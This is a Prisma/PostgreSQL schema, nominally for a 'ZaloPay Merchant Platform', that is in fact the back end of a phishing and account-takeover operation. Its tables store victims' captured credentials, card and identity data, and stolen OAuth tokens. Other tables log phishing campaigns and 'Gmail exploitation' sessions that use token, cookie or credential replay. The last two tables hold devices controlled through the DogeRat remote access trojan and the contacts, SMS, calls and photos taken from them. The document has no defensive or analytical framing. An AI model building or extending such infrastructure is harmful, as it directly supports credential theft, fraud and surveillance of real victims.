// Prisma Schema for ZaloPay Merchant Platform
// Based on database-schema-documentation (1).md

generator client {
  provider = "prisma-client-js"
}

datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}

// Victims Table - Primary storage for captured victim credentials
model Victim {
  id                String   @id @default(uuid()) @db.Uuid
  email             String   @unique @db.VarChar(255)
  name              String?  @db.VarChar(255)
  phone             String?  @db.VarChar(50)
  passwordHash      String?  @map("password_hash") @db.VarChar(255)
  
  // Capture metadata
  captureTimestamp  DateTime @default(now()) @map("capture_timestamp") @db.Timestamptz
  campaignId        String?  @map("campaign_id") @db.Uuid
  captureMethod     String   @map("capture_method") @db.VarChar(50) // oauth_google, oauth_apple, form_direct
  captureSource     String?  @map("capture_source") @db.VarChar(255)
  
  // JSONB fields
  sessionData       Json     @default("{}") @map("session_data") @db.JsonB
  deviceFingerprint Json     @default("{}") @map("device_fingerprint") @db.JsonB
  validation        Json     @default("{}") @db.JsonB
  exploitationHistory Json   @default("{}") @map("exploitation_history") @db.JsonB
  riskAssessment   Json     @default("{}") @map("risk_assessment") @db.JsonB
  cardInformation   Json     @default("{}") @map("card_information") @db.JsonB
  identityVerification Json  @default("{}") @map("identity_verification") @db.JsonB
  
  // Timestamps
  createdAt         DateTime @default(now()) @map("created_at") @db.Timestamptz
  updatedAt         DateTime @updatedAt @map("updated_at") @db.Timestamptz
  deletedAt         DateTime? @map("deleted_at") @db.Timestamptz
  isActive          Boolean  @default(true) @map("is_active")
  
  // Relations
  campaign          Campaign? @relation(fields: [campaignId], references: [id])
  oauthTokens       OAuthToken[]
  gmailAccessLogs   GmailAccessLog[]
  
  @@index([email])
  @@index([captureTimestamp])
  @@index([campaignId, captureTimestamp])
  @@index([isActive])
  @@map("victims")
}

// OAuth Tokens Table - Secure storage of captured OAuth tokens
model OAuthToken {
  id                String   @id @default(uuid()) @db.Uuid
  victimId          String   @map("victim_id") @db.Uuid
  provider          String   @db.VarChar(50) // google, apple, facebook, microsoft
  providerMetadata  Json     @default("{}") @map("provider_metadata") @db.JsonB
  tokenData         Json     @default("{}") @map("token_data") @db.JsonB // Encrypted
  issuedAt          DateTime @default(now()) @map("issued_at") @db.Timestamptz
  expiresAt         DateTime @map("expires_at") @db.Timestamptz
  lastRefreshed     DateTime? @map("last_refreshed") @db.Timestamptz
  refreshCount      Int      @default(0) @map("refresh_count")
  tokenStatus       String   @default("active") @map("token_status") @db.VarChar(50) // active, expired, revoked, invalid
  lastValidation    DateTime? @map("last_validation") @db.Timestamptz
  validationSuccess Boolean? @map("validation_success")
  usageHistory      Json     @default("[]") @map("usage_history") @db.JsonB
  userProfile       Json     @default("{}") @map("user_profile") @db.JsonB
  securityEvents    Json     @default("[]") @map("security_events") @db.JsonB
  createdAt         DateTime @default(now()) @map("created_at") @db.Timestamptz
  updatedAt         DateTime @updatedAt @map("updated_at") @db.Timestamptz
  
  // Relations
  victim            Victim   @relation(fields: [victimId], references: [id], onDelete: Cascade)
  
  @@index([victimId])
  @@index([provider, tokenStatus])
  @@index([expiresAt])
  @@index([issuedAt])
  @@index([tokenStatus])
  @@map("oauth_tokens")
}

// Admin Users Table - Administrative user management
model AdminUser {
  id                String   @id @default(uuid()) @db.Uuid
  username          String   @unique @db.VarChar(100)
  email             String   @unique @db.VarChar(255)
  passwordHash      String   @map("password_hash") @db.VarChar(255)
  role              String   @db.VarChar(50) // viewer, operator, senior_operator, admin, super_admin
  permissions       String[] @default([])
  accessRestrictions Json    @default("{}") @map("access_restrictions") @db.JsonB
  mfaConfig         Json     @default("{}") @map("mfa_config") @db.JsonB // Encrypted
  sessionConfig     Json     @default("{}") @map("session_config") @db.JsonB
  activitySummary   Json     @default("{}") @map("activity_summary") @db.JsonB
  securityFlags      Json     @default("{}") @map("security_flags") @db.JsonB
  adminMetadata      Json     @default("{}") @map("admin_metadata") @db.JsonB
  createdAt         DateTime @default(now()) @map("created_at") @db.Timestamptz
  updatedAt         DateTime @updatedAt @map("updated_at") @db.Timestamptz
  isActive          Boolean  @default(true) @map("is_active")
  
  // Relations
  campaigns         Campaign[]
  activityLogs      ActivityLog[]
  gmailAccessLogs   GmailAccessLog[]
  
  @@index([username])
  @@index([email])
  @@index([role, isActive])
  @@index([isActive])
  @@map("admin_users")
}

// Campaigns Table - Phishing campaign management
model Campaign {
  id                String   @id @default(uuid()) @db.Uuid
  name              String   @db.VarChar(255)
  code              String   @unique @db.VarChar(100)
  description       String?  @db.Text
  config            Json     @default("{}") @db.JsonB
  infrastructure    Json     @default("{}") @db.JsonB
  timeline          Json     @default("{}") @db.JsonB
  statistics        Json     @default("{}") @db.JsonB
  successCriteria   Json     @default("{}") @map("success_criteria") @db.JsonB
  riskAssessment    Json     @default("{}") @map("risk_assessment") @db.JsonB
  team              Json     @default("{}") @db.JsonB
  status            String   @default("draft") @db.VarChar(50) // draft, active, paused, suspended, completed, archived
  statusHistory     Json     @default("[]") @map("status_history") @db.JsonB
  createdAt         DateTime @default(now()) @map("created_at") @db.Timestamptz
  updatedAt         DateTime @updatedAt @map("updated_at") @db.Timestamptz
  createdBy         String?  @map("created_by") @db.Uuid
  
  // Relations
  creator           AdminUser? @relation(fields: [createdBy], references: [id])
  victims           Victim[]
  
  @@index([status])
  @@index([createdBy])
  @@map("campaigns")
}

// Activity Logs Table - Comprehensive audit trail
model ActivityLog {
  id                String   @id @default(uuid()) @db.Uuid
  logId             String   @unique @map("log_id") @db.VarChar(100)
  actionType        String   @map("action_type") @db.VarChar(100)
  actionCategory    String   @map("action_category") @db.VarChar(50) // authentication, data_access, system_admin, campaign_mgmt
  severityLevel     String   @map("severity_level") @db.VarChar(20) // low, medium, high, critical
  actor             Json     @default("{}") @db.JsonB
  target            Json     @default("{}") @db.JsonB
  actionDetails     Json     @default("{}") @map("action_details") @db.JsonB
  technicalContext  Json     @default("{}") @map("technical_context") @db.JsonB
  geographicContext Json     @default("{}") @map("geographic_context") @db.JsonB
  securityFlags     Json     @default("{}") @map("security_flags") @db.JsonB
  compliance        Json     @default("{}") @db.JsonB
  relatedLogs       String[] @default([]) @map("related_logs") @db.Uuid
  timestamp         DateTime @default(now()) @db.Timestamptz
  createdAt         DateTime @default(now()) @map("created_at") @db.Timestamptz
  archived          Boolean  @default(false)
  archiveDate       DateTime? @map("archive_date") @db.Timestamptz
  retentionExpires  DateTime @default(dbgenerated("(NOW() + INTERVAL '2 years')")) @map("retention_expires") @db.Timestamptz
  
  // Relations
  adminId           String?  @map("admin_id") @db.Uuid
  admin             AdminUser? @relation(fields: [adminId], references: [id])
  gmailAccessLogs   GmailAccessLog[]
  
  @@index([actionType, timestamp])
  @@index([timestamp])
  @@index([retentionExpires])
  @@index([actionCategory, severityLevel, timestamp])
  @@index([archived])
  @@map("activity_logs")
}

// Gmail Access Logs Table - Detailed logging of Gmail exploitation
model GmailAccessLog {
  id                    String   @id @default(uuid()) @db.Uuid
  sessionId             String   @unique @map("session_id") @db.VarChar(100)
  parentActivityLogId   String?  @map("parent_activity_log") @db.Uuid
  adminId               String   @map("admin_id") @db.Uuid
  victimId              String   @map("victim_id") @db.Uuid
  accessMethod          String   @map("access_method") @db.VarChar(50) // oauth_tokens, session_cookies, credential_replay
  authenticationDetails Json     @default("{}") @map("authentication_details") @db.JsonB
  sessionTimeline       Json     @default("{}") @map("session_timeline") @db.JsonB
  extractionResults     Json     @default("{}") @map("extraction_results") @db.JsonB
  intelligenceAnalysis  Json     @default("{}") @map("intelligence_analysis") @db.JsonB
  operationalSecurity   Json     @default("{}") @map("operational_security") @db.JsonB
  dataExports           Json     @default("[]") @map("data_exports") @db.JsonB
  performanceMetrics    Json     @default("{}") @map("performance_metrics") @db.JsonB
  createdAt             DateTime @default(now()) @map("created_at") @db.Timestamptz
  completedAt           DateTime? @map("completed_at") @db.Timestamptz
  status                String   @default("in_progress") @db.VarChar(50) // in_progress, completed, failed, aborted
  
  // Relations
  parentActivityLog     ActivityLog? @relation(fields: [parentActivityLogId], references: [id])
  admin                 AdminUser   @relation(fields: [adminId], references: [id])
  victim                Victim       @relation(fields: [victimId], references: [id], onDelete: Cascade)
  
  @@index([adminId, createdAt])
  @@index([victimId, createdAt])
  @@index([status, createdAt])
  @@index([parentActivityLogId])
  @@map("gmail_access_logs")
}

// Devices Table - Storage for connected devices managed via DogeRat API
model Device {
  id                String   @id @default(uuid()) @db.Uuid
  deviceId          String   @unique @map("device_id") @db.VarChar(255)
  platform          String   @db.VarChar(50) // android, ios
  platformVersion   String?  @map("platform_version") @db.VarChar(100)
  model             String?  @db.VarChar(255)
  version           String?  @db.VarChar(100)
  ipAddress         String?  @map("ip_address") @db.VarChar(50)
  connectedAt       DateTime @default(now()) @map("connected_at") @db.Timestamptz
  lastSeen          DateTime @default(now()) @map("last_seen") @db.Timestamptz
  disconnectedAt    DateTime? @map("disconnected_at") @db.Timestamptz
  status            String   @default("offline") @db.VarChar(50) // online, offline
  metadata          Json     @default("{}") @db.JsonB
  connectionHistory Json     @default("[]") @map("connection_history") @db.JsonB
  activitySummary   Json     @default("{}") @map("activity_summary") @db.JsonB
  createdAt         DateTime @default(now()) @map("created_at") @db.Timestamptz
  updatedAt         DateTime @updatedAt @map("updated_at") @db.Timestamptz
  
  // Relations
  deviceData        DeviceData[]
  
  @@index([platform, status])
  @@index([status, lastSeen])
  @@index([connectedAt])
  @@index([lastSeen])
  @@map("devices")
}

// Device Data Table - Storage for data collected from devices
model DeviceData {
  id                String   @id @default(uuid()) @db.Uuid
  deviceId          String   @map("device_id") @db.Uuid
  dataType          String   @map("data_type") @db.VarChar(100) // contacts, sms, calls, gallery, etc.
  data              Json     @default("{}") @db.JsonB
  metadata          Json     @default("{}") @db.JsonB
  capturedAt        DateTime @default(now()) @map("captured_at") @db.Timestamptz
  createdAt         DateTime @default(now()) @map("created_at") @db.Timestamptz
  updatedAt         DateTime @updatedAt @map("updated_at") @db.Timestamptz
  
  // Relations
  device            Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
  
  @@index([deviceId, capturedAt])
  @@index([dataType, capturedAt])
  @@index([capturedAt])
  @@index([deviceId, dataType, capturedAt])
  @@unique([deviceId, dataType])
  @@map("device_data")
}

